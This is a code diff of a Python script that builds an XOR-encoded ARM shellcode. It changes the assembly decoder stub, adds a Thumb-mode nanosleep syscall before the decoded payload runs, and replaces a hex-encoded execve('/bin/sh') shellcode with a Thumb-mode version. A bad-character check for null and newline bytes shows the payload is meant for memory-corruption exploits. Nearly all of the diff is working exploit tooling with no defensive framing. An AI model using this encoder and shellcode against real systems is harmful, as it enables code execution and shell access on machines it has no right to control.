@@ -49,31 +49,47 @@ def MakeXOR(size, xor=0x58):
     LOOP_SC_SIZE = MAX_SC_SIZE - size
 
     XOR="""
-    .global _start
-    .section .text
+.global _start
+.section .text
 
-    _start:
-        add r6, pc, #36+4
-        bx  r6
+_start:
+    adr r8, scode
 
-    main:
-        mov r4, #%s
-        #add r6, lr, #4
-        mov r6, lr
+main:
+    mov r4, #%s
+    adr r6, nanosleep
 
-    loop:
-        cmp r4, #%s
-        bxhi r6
-        sub r4, r4, #%s
-        ldrb r5, [lr, r4]
-        eor  r5, r5, #%s
-        strb r5, [lr, r4]
-        add  r4, r4, #%s
-        
-        b loop
-        bl main
+loop:
+    cmp  r4, #%s
+    bxhi r6
+    sub  r4, r4, #%s
+    ldrb r5, [r8, r4]
+    eor  r5, r5, #%s
+    strb r5, [r8, r4]
+    add  r4, r4, #%s
 
-    scode:
+backloop:
+    b loop
+backmain:
+    bl main
+
+nanosleep:
+    .arm
+    add r6, pc, #1
+    bx r6
+    .thumb
+nanosleep2:
+    sub r5, r5, r5
+    add r5, r5, #1
+    sub r6, r6, r6
+    push {r5, r6}
+    push {r5, r6}
+    mov r0, sp
+    mov r1, sp
+    mov r7, #162
+    svc 1
+
+scode:
     """ % (LOOP_SC_SIZE, MAX_SC_SIZE, LOOP_SC_SIZE, xor, LOOP_SC_SIZE+1)
 
     fn = tempfile.mktemp() # binary file
@@ -172,8 +188,8 @@ def checkBadChar(sc, bc=[0x00, 0x0a]):
     return bcs
 
 if __name__ == '__main__':
-    # /bin/sh
-    SC = "01608fe216ff2fe102a000220b2705b4694601df2f62696e2f7368000000c046".decode('hex')
+    # /bin/sh in thumb mode
+    SC = "02a000220b2705b4694601df2f62696e2f7368000000".decode('hex')
 
     prepareCompiler()
 
